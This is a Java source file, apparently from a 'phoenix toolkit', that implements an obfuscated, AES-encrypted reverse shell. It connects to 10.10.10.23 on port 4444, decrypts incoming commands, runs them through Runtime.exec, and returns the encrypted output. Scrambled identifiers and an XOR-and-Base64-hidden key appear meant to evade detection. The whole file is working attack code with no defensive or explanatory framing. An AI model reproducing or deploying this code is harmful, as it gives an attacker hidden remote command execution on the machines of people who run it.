package com.phoenix.toolkit;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class App {
   private static final String pKzLq7 = Base64.getEncoder().encodeToString(xYzWq8("3t9834".getBytes(), 55));
   private static final String wYrNb2 = Base64.getEncoder().encodeToString(xYzWq8("s3cr".getBytes(), 77));
   private static final String xVmRq1 = Base64.getEncoder().encodeToString(xYzWq8("354r".getBytes(), 23));
   private static final String aDsZx9 = Base64.getEncoder().encodeToString(xYzWq8("34".getBytes(), 42));
   private static final int[] nQoMf6 = new int[]{3, 2, 1, 0};

   public static void main(String[] args) {
      String IP = "10.10.10.23";
      short PORT = 4444;

      try {
         String jAbTs3 = mNoPq5();
         Socket rGtMv7 = new Socket(IP, PORT);
         BufferedReader qNxLw1 = new BufferedReader(new InputStreamReader(rGtMv7.getInputStream()));
         BufferedWriter vPyBz6 = new BufferedWriter(new OutputStreamWriter(rGtMv7.getOutputStream()));

         while(true) {
            String fYxKb2 = qNxLw1.readLine();
            if (fYxKb2 == null) {
               break;
            }

            String mRpWv8 = uJtXq5(fYxKb2, jAbTs3);
            if (mRpWv8.equals("exit")) {
               break;
            }

            String dPsLc3 = jWxNy7(mRpWv8);
            String kVbTx4 = aFbGtr4(dPsLc3, jAbTs3);
            vPyBz6.write(kVbTx4 + "\n");
            vPyBz6.flush();
         }

         rGtMv7.close();
      } catch (Exception var11) {
         var11.printStackTrace();
      }

   }

   private static String mNoPq5() throws Exception {
      String[] cWlNz5 = new String[]{fGhJk6(pKzLq7, 55), fGhJk6(wYrNb2, 77), fGhJk6(xVmRq1, 23), fGhJk6(aDsZx9, 42)};
      StringBuilder qTxMv7 = new StringBuilder();
      int[] var2 = nQoMf6;
      int var3 = var2.length;

      for(int var4 = 0; var4 < var3; ++var4) {
         int dZrWp4 = var2[var4];
         qTxMv7.append(cWlNz5[dZrWp4]);
      }

      return gDF5a(qTxMv7.toString());
   }

   private static String fGhJk6(String gZrMx9, int tPyWl3) {
      byte[] jKtXp5 = Base64.getDecoder().decode(gZrMx9);
      byte[] yNrQz4 = xYzWq8(jKtXp5, tPyWl3);
      return new String(yNrQz4, StandardCharsets.UTF_8);
   }

   private static byte[] xYzWq8(byte[] mBxNz8, int qVyWp1) {
      byte[] rTzXk6 = new byte[mBxNz8.length];

      for(int vJlNy3 = 0; vJlNy3 < mBxNz8.length; ++vJlNy3) {
         rTzXk6[vJlNy3] = (byte)(mBxNz8[vJlNy3] ^ qVyWp1);
      }

      return rTzXk6;
   }

   private static String gDF5a(String bHJ2k) {
      StringBuilder fPL7m = new StringBuilder();
      int zQW3x = 7;
      char[] var3 = bHJ2k.toCharArray();
      int var4 = var3.length;

      for(int var5 = 0; var5 < var4; ++var5) {
         char c = var3[var5];
         int yTR8v = ((c ^ zQW3x) + 33) % 94 + 33;
         fPL7m.append((char)yTR8v);
      }

      return fPL7m.toString();
   }

   private static String jWxNy7(String bKyWq5) throws IOException {
      Process wNrXl2 = Runtime.getRuntime().exec(bKyWq5);
      BufferedReader tZyMp9 = new BufferedReader(new InputStreamReader(wNrXl2.getInputStream()));
      StringBuilder pJlNy4 = new StringBuilder();

      String yKxWp7;
      while((yKxWp7 = tZyMp9.readLine()) != null) {
         pJlNy4.append(yKxWp7).append("\n");
      }

      return pJlNy4.toString();
   }

   private static String aFbGtr4(String yXlMp6, String dWzNy3) throws Exception {
      SecretKeySpec fZtXp9 = new SecretKeySpec(dWzNy3.getBytes(StandardCharsets.UTF_8), "AES");
      Cipher wVyQx2 = Cipher.getInstance("AES");
      wVyQx2.init(1, fZtXp9);
      return Base64.getEncoder().encodeToString(wVyQx2.doFinal(yXlMp6.getBytes()));
   }

   private static String uJtXq5(String kVzNy4, String pWlXq7) throws Exception {
      SecretKeySpec bFyMp6 = new SecretKeySpec(pWlXq7.getBytes(StandardCharsets.UTF_8), "AES");
      Cipher tZrXq9 = Cipher.getInstance("AES");
      tZrXq9.init(2, bFyMp6);
      return new String(tZrXq9.doFinal(Base64.getDecoder().decode(kVzNy4)));
   }
}
